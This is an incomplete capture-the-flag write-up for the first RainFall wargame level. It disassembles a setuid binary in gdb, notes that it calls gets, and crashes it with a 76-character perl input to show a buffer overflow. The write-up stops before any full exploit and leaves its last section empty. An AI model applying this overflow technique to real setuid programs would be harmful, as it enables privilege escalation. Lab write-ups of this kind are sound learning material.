# Level 1

## Vulnerability

Buffer overflow exploit

## Context

```
level1@RainFall:~$ ls -l
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```

## Solution

Let's see what the binary does. 
```
level1@RainFall:~$ ./level1

```
It looks like it's waiting on input from the stdin. Let's take a look in gdb. 
```
level1@RainFall:~$ gdb ./level1
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:	  push   %ebp
   0x08048481 <+1>:	  mov    %esp,%ebp
   0x08048483 <+3>: 	and    $0xfffffff0,%esp
   0x08048486 <+6>: 	sub    $0x50,%esp
   0x08048489 <+9>:	  lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
End of assembler dump.
(gdb)
```
We can see here the binary calls the C function ```gets```, which copies a string from stdin to a buffer. 
Let's see if we can cause a buffer overflow. 
```
level1@RainFall:~$ perl -E "print '*' x 76" | ./level1
Illegal instruction (core dumped)
```


## Recreate Exploited Binary
